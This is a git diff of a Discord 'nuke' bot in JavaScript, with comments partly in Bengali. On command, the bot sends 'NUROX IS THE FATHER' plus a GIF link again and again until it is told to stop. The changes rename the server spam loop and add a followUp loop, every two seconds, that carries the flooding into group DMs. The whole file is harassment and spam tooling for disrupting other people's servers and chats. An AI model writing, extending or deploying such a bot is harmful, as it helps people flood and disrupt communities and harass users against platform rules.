@@ -17,7 +17,7 @@ let isNuking = false;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const OWNER_ID = process.env.OWNER_ID;
 
-// GIF লিঙ্ক
+// GIF link
 const SPECIFIC_GIF = 'https://giphy.com/gifs/cat-salam-salamualaikum-alaikum-WykUqckDqi95YIqtFZ';
 
 // Register Slash Commands for User Install / Guilds
@@ -50,11 +50,11 @@ client.on('ready', async () => {
   }
 });
 
-// Helper function to run the nuke loop
-async function runNukeLoop(targetChannel) {
+// Helper function to run normal nuke loop for servers
+async function runNormalNuke(channel) {
   while (isNuking) {
     try {
-      await targetChannel.send(`**NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
+      await channel.send(`**NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
     } catch (err) {
       console.error('Error sending message:', err);
     }
@@ -73,7 +73,7 @@ client.on('messageCreate', async (message) => {
     }
     isNuking = true;
     await message.reply('💣 Nuke Activated!');
-    await runNukeLoop(message.channel);
+    await runNormalNuke(message.channel);
   }
 
   if (message.content.toLowerCase() === 'stop') {
@@ -104,8 +104,16 @@ client.on('interactionCreate', async (interaction) => {
     isNuking = true;
     await interaction.reply({ content: '💣 Nuke Activated!' });
     
-    // Group DM ba channel-e message pathanor jonno interaction.channel use kora
-    await runNukeLoop(interaction.channel);
+    // Group DM-e interaction.followUp() use kora hocche
+    while (isNuking) {
+      try {
+        await interaction.followUp({ content: `**NUROX IS THE FATHER**\n${SPECIFIC_GIF}` });
+      } catch (err) {
+        console.error('Error sending followUp:', err);
+        break;
+      }
+      await new Promise(resolve => setTimeout(resolve, 2000));
+    }
   }
 
   if (commandName === 'stop') {
